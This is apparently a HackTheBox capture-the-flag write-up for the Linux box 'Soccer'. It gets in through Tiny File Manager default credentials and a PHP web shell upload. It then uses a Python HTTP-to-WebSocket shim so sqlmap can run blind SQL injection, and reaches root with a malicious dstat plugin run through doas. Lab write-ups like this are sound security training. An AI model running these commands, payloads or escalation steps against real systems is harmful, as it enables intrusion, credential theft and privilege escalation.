---
title: HTB - Soccer
date: 2026-10-13
tags:
  - hackthebox
  - writeup
  - file-upload
  - websocket-sqli
  - gtfobins
os: Linux
difficulty: Easy
description: "HTB Soccer (Easy). Tiny File Manager default creds for a PHP web shell foothold, blind SQL injection over a WebSocket bridged to sqlmap for the player creds, and doas + dstat external plugin for root."
---

<p style="text-align:center">
  <img src="featured.png" alt="Soccer box" width="250">
</p>

<p>
  <img src="https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat&logo=hackthebox&logoColor=black" alt="Platform">
  <img src="https://img.shields.io/badge/OS-Linux-E95420?style=flat&logo=linux&logoColor=white" alt="OS">
  <img src="https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat" alt="Difficulty">
</p>

> **TL;DR** - Foothold through Tiny File Manager running with default credentials, uploading a PHP web shell. A hidden vhost `soc-player.soccer.htb` exposes a ticket feature that talks to the backend over a WebSocket, and its `id` field is blind-SQL-injectable. Bridging the WebSocket through a small local HTTP shim lets sqlmap automate the extraction, leaking the `player` DB credentials, which are reused for SSH. Root comes from `doas` allowing `player` to run `dstat`, whose external-plugin mechanism loads an attacker-controlled Python module.

---

## Recon

Starting with a basic nmap scan with the following command:

```bash
nmap -sV -sC -p- 10.129.72.111 -oA nmap/soccer
```

I got this output:

![](Images/Soccer-nmap.png)

Three ports open. I added the hostname `soccer.htb` to `/etc/hosts` and opened it in the browser.

![](Images/Soccer-webpage.png)

A football news site (yes, football, not soccer). The page offered little interaction, so I fuzzed for directories.

```bash
gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt
```

![](Images/Soccer-gobuster.png)

One result stood out, so I visited it.

![](Images/Soccer-tinyweb.png)

It's `Tiny File Manager 2.4.3`. A quick search turned up default credentials for it, documented among other places in a Nuclei template.

![](Images/Soccer-defautls-creds.png)

The default creds `admin:admin@123` logged straight in. File managers are a double win here: the default creds get us in, and the upload feature is an RCE primitive on a PHP host.

![](Images/Soccer-webapp-admin.png)

---

## Foothold

With an authenticated file manager on a PHP host, the move is to upload a web shell. I uploaded a `rev_shell.php`, set up a listener, and opened the uploaded file in the browser to execute it.

![](Images/Soccer-open.png)

And I got a shell as the web user.

![](Images/Soccer-initial-footholder.png)

Enumerating inside the target, `/etc/hosts` revealed another subdomain: `soc-player.soccer.htb`.

![](Images/Soccer-subdomain.png)

I added it to my own `/etc/hosts` and browsed to it.

![](Images/Soccer-socplayer.png)

Same application look, but with extra functionality, including user registration and a ticket feature that checks whether a ticket exists, its price, and the time until the match.

![](Images/Soccer-ticker.png)

---

## soc-player → player (WebSocket SQLi)

While enumerating the host I found a MySQL database but no usable credentials for it, so the ticket feature looked like the likeliest injection point. The ticket check didn't go through a normal HTTP form, it talked to the backend over a `WebSocket` on port 9091, sending a JSON message with an `id` field. User input reaching a query over a WebSocket is still SQL injection, the transport just makes it awkward for standard tooling.

sqlmap doesn't speak WebSocket directly, so I put a small local HTTP server in front of it that forwards each request into the WebSocket and returns the response. sqlmap then attacks the shim as if it were a normal HTTP endpoint.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote
import websocket, json

WS_URL = "ws://soc-player.soccer.htb:9091/"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        qs = parse_qs(urlparse(self.path).query)
        payload = unquote(qs.get("id", [""])[0])
        ws = websocket.create_connection(WS_URL)
        ws.send(json.dumps({"id": payload}))
        resp = ws.recv()
        ws.close()

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(resp.encode())

    def log_message(self, *a):
        pass

HTTPServer(("127.0.0.1", 8081), Handler).serve_forever()
```

Then I pointed sqlmap at the shim. The injection was blind/time-based, so I used the time technique:

```bash
sqlmap -u "http://127.0.0.1:8081/?id=1" -p id --dbms=mysql --technique=T --time-sec=5 --level=5 --risk=3 --batch --dbs
```

After a while it dumped a set of credentials.

![](Images/Soccer-db.png)

The creds `player:PlayerOftheMatch2022` matched a local user, so I tried them over SSH:

```bash
ssh player@10.129.72.111
```

![](Images/Soccer-playerin.png)

### user.txt

![](Images/Soccer-usertxt.png)

---

## Privilege Escalation - doas + dstat external plugin

Basic enumeration as `player` showed a `doas` binary, and its config allowed `player` to run `/usr/bin/dstat` as root.

![](Images/Soccer-doas.png)

![](Images/Soccer-dstat.png)

`doas` is OpenBSD's `sudo`, so finding it on Linux is a flag in itself, someone set up a specific privileged command. The target of that command, `dstat`, is on GTFOBins, and the technique there is its plugin system.

[GTFOBins](https://gtfobins.github.io/gtfobins/dstat/) documents that `dstat` loads external plugins as Python modules from specific directories, running whatever code they contain.

![](Images/Soccer-gtfobins.png)

`/usr/local/share/dstat/` was writable, so I dropped a plugin there. The filename must follow the `dstat_<name>.py` pattern, where `<name>` is what you pass on the command line:

```python
# /usr/local/share/dstat/dstat_root.py
import os
os.execvp("/bin/bash", ["bash"])
```

Since `player` runs `dstat` as root via `doas`, invoking our plugin by name spawns a root shell:

```bash
doas /usr/bin/dstat --root
```

![](Images/Soccer-root.png)

### root.txt

![](Images/Soccer-rootxt.png)

---

## Conclusion

Soccer is a clean easy box with one genuinely interesting step: the WebSocket SQL injection. The foothold (default creds → upload → web shell) and the root (GTFOBins `dstat`) are textbook, but the lateral move forces you to realise standard tooling won't reach a WebSocket, and to bridge sqlmap to it with a tiny proxy.

What I take from it is that shim pattern: any time input reaches a query over a non-HTTP transport, you can usually wrap it so your normal tools work, rather than hand-rolling the whole injection. The rest is good enumeration habits, spotting the hidden vhost in `/etc/hosts` and checking GTFOBins for any binary you can run via `sudo`/`doas`.

---

## Kill chain summary

| Phase    | Vector                                                        | Result                    |
| -------- | ------------------------------------------------------------- | ------------------------- |
| Recon    | nmap + gobuster                                               | Tiny File Manager 2.4.3   |
| Foothold | Default creds `admin:admin@123` → PHP web shell upload        | Shell as web user         |
| User     | WebSocket SQLi (sqlmap via HTTP→WS shim) → `PlayerOftheMatch2022` | `player` - user.txt   |
| Root     | `doas dstat` + writable external plugin dir                   | `root` - root.txt         |

## References

- Tiny File Manager - https://github.com/prasathmani/tinyfilemanager
- GTFOBins - dstat - https://gtfobins.github.io/gtfobins/dstat/
- Blind SQLi over WebSocket (sqlmap bridging) - https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
